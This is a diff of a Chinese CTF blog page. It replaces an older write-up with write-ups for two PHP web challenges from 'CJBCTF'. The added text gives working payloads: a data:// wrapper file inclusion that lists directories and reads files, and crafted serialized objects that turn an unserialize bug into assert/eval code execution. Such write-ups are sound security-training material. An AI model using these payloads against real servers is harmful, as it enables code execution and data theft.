@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>Newctf - 1__/\/のblog</title>
+  <title>CJBCTF - 1__/\/のblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -164,12 +164,12 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0020.jpg') no-repeat center center;
+         style="background: url('/img/0022.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Newctf">
+            <span class="h2" id="subtitle" title="CJBCTF">
               
             </span>
 
@@ -179,8 +179,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-06-02 22:48" pubdate>
-        2021年6月2日 晚上
+      <time datetime="2021-07-11 10:38" pubdate>
+        2021年7月11日 上午
       </time>
     </span>
   
@@ -191,7 +191,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      122 字
+      512 字
     </span>
   
 
@@ -201,7 +201,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      18
        分钟
     </span>
   
@@ -235,22 +235,88 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Newctf</h1>
+            <h1 style="display: none">CJBCTF</h1>
             
             <div class="markdown-body">
-              <h2 id="2021-6-1萌新赛-easy-web"><a href="#2021-6-1萌新赛-easy-web" class="headerlink" title="2021.6.1萌新赛-easy_web"></a>2021.6.1萌新赛-easy_web</h2><p>hint:这个图片真好看呀，没啥隐藏的东西吧    </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png" srcset="/img/loading.gif">       </p>
-<p>第一点：<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>这一串是123456的MD5       </p>
-<p>第二点：<code>===</code>可以数组绕过        </p>
-<p>第三点：<code>$array[++$c]=1</code>数组索引溢出，<code>$c=9223372036854775806</code>      </p>
-<p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p>
-<p>返回：   </p>
-<div class="hljs"><pre><code>你觉得就这么简单吗？？？，可以告诉你密码哦！        
+              <h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul>
+<li>文件包含</li>
+</ul>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-password: xluoyyds123456@@@      </code></pre></div>
-<p>然后是一个图片隐写，下载下来背景图片，后缀改为<code>.rar</code>       </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png" srcset="/img/loading.gif">         </p>
-<p>输入密码得到flag    </p>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span>
+<span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span>
+<span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span>
+<span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span>
+<span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span>
+<span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">*/</span>
+
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;
+    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);
+    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;
+        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];
+    &#125;
+&#125;</code></pre></div></code></pre>
+<p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p>
+<p>看到include要想到伪协议了    </p>
+<p>这里用<code>data://text/plain</code>     </p>
+<p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png" srcset="/img/loading.gif">    </p>
+<p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>得到flag     </p>
+<h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul>
+<li>代码审计</li>
+</ul>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;
+    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;
+    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">global</span> $safe;
+        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;
+            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;
+            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;
+            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;
+        &#125;
+        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">global</span> $safe;
+        var_dump($safe);
+    &#125;
+&#125;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;
+    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;
+        unserialize($info);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    $hacker=<span class="hljs-keyword">new</span> Hacker();
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;</code></pre></div></code></pre>
+<ul>
+<li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p>
+<p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png" srcset="/img/loading.gif">    </p>
+<p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p>
+</li>
+</ul>
+<ul>
+<li><p>第二种思路：利用<code>$safe</code><br>  根目录payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  <code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>这样穿越目录tql   </p>
+<p>  读flagpayload：<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p>
+</li>
+</ul>
 
             </div>
             <hr>
@@ -262,8 +328,6 @@ password: xluoyyds123456@@@      </code></pre></div>
                     
                       <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                     
-                      <a class="hover-with-bg" href="/categories/CTF/php/">php</a>
-                    
                   </div>
                 
                 
@@ -274,7 +338,7 @@ password: xluoyyds123456@@@      </code></pre></div>
                     
                       <a class="hover-with-bg" href="/tags/WP/">WP</a>
                     
-                      <a class="hover-with-bg" href="/tags/php/">php</a>
+                      <a class="hover-with-bg" href="/tags/CJBCTF/">CJBCTF</a>
                     
                   </div>
                 
@@ -287,18 +351,12 @@ password: xluoyyds123456@@@      </code></pre></div>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/11/CJBCTF/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CJBCTF</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/05/27/NEEPUCTF/">
-                        <span class="hidden-mobile">NEEPUCTF</span>
+                      <a href="/2021/06/02/newctf/">
+                        <span class="hidden-mobile">Newctf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
